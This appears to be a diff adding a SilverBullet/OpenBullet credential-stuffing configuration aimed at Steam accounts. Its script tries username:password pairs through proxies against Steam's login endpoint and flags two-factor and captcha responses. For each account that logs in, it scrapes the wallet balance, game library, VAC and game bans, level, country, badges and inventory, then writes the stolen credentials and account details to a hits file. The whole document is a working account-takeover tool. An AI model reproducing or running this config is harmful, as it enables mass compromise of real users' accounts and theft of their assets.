@@ -1,0 +1,225 @@
+[SETTINGS]
+{
+  "Name": "Steam",
+  "SuggestedBots": 200,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-19T03:33:15.7786543+03:00",
+  "AdditionalInfo": "",
+  "RequiredPlugins": [],
+  "Author": "Gato",
+  "Version": "1.1.2 [SB]",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "IsBase64": false,
+  "FilterList": [],
+  "EvaluateMathOCR": false,
+  "SecurityProtocol": 0,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "AcceptInsecureCertificates": true,
+  "DisableNotifications": false,
+  "DisableImageLoading": false,
+  "DefaultProfileDirectory": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": "",
+  "Title": "Steam (1)",
+  "IconPath": "Icon\\svbfile.ico",
+  "LicenseSource": null,
+  "Message": null,
+  "MessageColor": "#FFFFFFFF",
+  "HitInfoFormat": "[{hit.Type}][{hit.Proxy}] {hit.Data} - [{hit.CapturedString}]",
+  "AuthorColor": "#FFFFB266",
+  "WordlistColor": "#FFB5C2E1",
+  "BotsColor": "#FFA8FFFF",
+  "CustomInputColor": "#FFD6C7C7",
+  "CPMColor": "#FFFFFFFF",
+  "ProgressColor": "#FFAD93E3",
+  "HitsColor": "#FF66FF66",
+  "CustomColor": "#FFFFB266",
+  "ToCheckColor": "#FF7FFFD4",
+  "FailsColor": "#FFFF3333",
+  "RetriesColor": "#FFFFFF99",
+  "OcrRateColor": "#FF4698FD",
+  "ProxiesColor": "#FFFFFFFF"
+}
+
+[SCRIPT]
+FUNCTION Replace "@.*" "" UseRegex=TRUE "<USER>" -> VAR "US" 
+
+FUNCTION CurrentUnixTime -> VAR "0" 
+
+REQUEST POST "https://steamcommunity.com/login/getrsakey/" 
+  CONTENT "donotcache=<0>&username=<US>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Origin: https://steamcommunity.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-us" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Ban OR 
+    KEY "<SOURCE>" DoesNotContain "success\":true" 
+
+PARSE "<SOURCE>" JSON "publickey_mod" -> VAR "1" 
+
+PARSE "<SOURCE>" JSON "publickey_exp" -> VAR "11" 
+
+PARSE "<SOURCE>" JSON "timestamp" -> VAR "111" 
+
+#PASS2 FUNCTION RSAPKCS1PAD2 "<1>" "<11>" "<PASS>" -> VAR "PASS2" 
+
+IF "<PASS2>" DoesNotContain "=="
+JUMP #PASS2
+ENDIF 
+
+FUNCTION URLEncode "<PASS2>" -> VAR "PASS3" 
+
+FUNCTION CurrentUnixTime -> VAR "0" 
+
+REQUEST POST "https://steamcommunity.com/login/dologin/" 
+  CONTENT "donotcache=<0>&password=<PASS3>&username=<US>&twofactorcode=&emailauth=&loginfriendlyname=&captchagid=-1&captcha_text=&emailsteamid=&rsatimestamp=<111>&remember_login=false&oauth_client_id=3638BFB1" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "Accept: */*" 
+  HEADER "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "Origin: https://steamcommunity.com" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Referer: https://steamcommunity.com/mobilelogin?oauth_client_id=3638BFB1&oauth_scope=read_profile%20write_profile%20read_client%20write_client" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+  HEADER "Accept-Language: en-us" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "The account name or password that you have entered is incorrect" 
+    KEY "Incorrect account name or password." 
+  KEYCHAIN Success OR 
+    KEY "success\":true" 
+  KEYCHAIN Custom "2FACTOR" OR 
+    KEY "requires_twofactor\":true,\"" 
+    KEY "emailauth_needed\":true" 
+  KEYCHAIN Ban OR 
+    KEY "captcha_needed\":true" 
+
+PARSE "<SOURCE>" JSON "steamid" -> VAR "ID" 
+
+REQUEST GET "https://store.steampowered.com/account/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK 
+  KEYCHAIN Success OR 
+    KEY "s account</title>" 
+
+PARSE "<SOURCE>" LR "account_manage_label\">Status:" "class=\"account_manage_link" -> VAR "st" 
+
+PARSE "<st>" LR "\">" "</a>" -> CAP "Status" 
+
+PARSE "<SOURCE>" LR "<div class=\"accountData price\">" "</div>" CreateEmpty=FALSE -> CAP "Balance" 
+
+REQUEST GET "https://steamcommunity.com/profiles/<ID>/games?tab=all" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+KEYCHECK BanOnToCheck=FALSE 
+  KEYCHAIN Custom "FREE" AND 
+    KEY "<SOURCE>" DoesNotContain ",\"name\":\"" 
+  KEYCHAIN Custom "EXPIRED" OR 
+    KEY "Your profile is being forced private due to an active Community Ban on your account." 
+
+PARSE "<SOURCE>" LR "var rgGames = " "var rgChangingGames " -> VAR "GA" 
+
+PARSE "<GA>" LR "name\":\"" "\"," Recursive=TRUE -> VAR "Games" 
+
+FUNCTION Replace "," " | " "<Games>" -> CAP "Games" 
+
+FUNCTION CountOccurrences ",\"name\":\"" "<GA>" -> CAP "Total Games" 
+
+REQUEST GET "https://help.steampowered.com/en/wizard/VacBans" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+PARSE "<SOURCE>" LR "Bans applied by VAC or Valve Anti-Cheat" "Read our FAQ on being VAC banned." -> VAR "vac1" 
+
+PARSE "<vac1>" LR "<span  class=\"help_highlight_text\">" "</span> " Recursive=TRUE CreateEmpty=FALSE -> CAP "VAC" 
+
+PARSE "<SOURCE>" LR "Bans applied by the Game Developer" "Game Bans are not VAC Bans and they are issued by the individual game." -> VAR "GAMEBAN1" 
+
+PARSE "<GAMEBAN1>" LR "<span class=\"help_highlight_text\">" "</span> " CreateEmpty=FALSE -> CAP "Ban?" 
+
+REQUEST GET "https://steamcommunity.com/profiles/<ID>/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+PARSE "<SOURCE>" LR "class=\"friendPlayerLevelNum\">" "</span>" -> CAP "Level" 
+
+PARSE "<SOURCE>" LR "steamyears" "_" CreateEmpty=FALSE -> CAP "Years Badge" 
+
+PARSE "<SOURCE>" LR "<img class=\"profile_flag\"" "<div class=\"" -> VAR "CU" 
+
+PARSE "<CU>" LR "\">" "</div>" CreateEmpty=FALSE -> CAP "Country" 
+
+PARSE "<SOURCE>" LR "class=\"profile_badges_badge \"  data-tooltip-html=\"" "&lt;br&gt;" Recursive=TRUE -> VAR "Ba" 
+
+FUNCTION Replace "," " | " "<Ba>" -> CAP "Badges" 
+
+REQUEST GET "https://steamcommunity.com/profiles/<ID>/inventory" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+PARSE "<SOURCE>" CSS "[data-appid]" "innerHTML" Recursive=TRUE CreateEmpty=FALSE -> CAP "Inventory Items" 
+
+REQUEST GET "https://steamcommunity.com/inventory/<ID>/570/2?l=english&count=75" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 13_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148" 
+  HEADER "Accept: */*" 
+  HEADER "X-Requested-With: XMLHttpRequest" 
+  HEADER "Referer: https://steamcommunity.com/profiles/<ID>/inventory" 
+  HEADER "Accept-Language: en-us" 
+  HEADER "Accept-Encoding: gzip, deflate, br" 
+
+IF "<SOURCE>" Contains "\"name\":\"Loyalty Badge\""
+SET CAP "PRIME" "YES"
+ELSE
+SET CAP "PRIME" "NO"
+ENDIF
+
+UTILITY File "steamHITS.txt" AppendLines "<US>:<PASS> | Status = <Status> | Balance = <Balance> | Games = <Games> | Total Games = <Total Games> | VAC = <VAC> | Ban? = <Ban?> | Level = <Level> | Years Badge = <Years Badge> | Country = <Country> | Badges = <Badges> | Inventory Items = <Inventory Items> | PRIME = <PRIME>" 
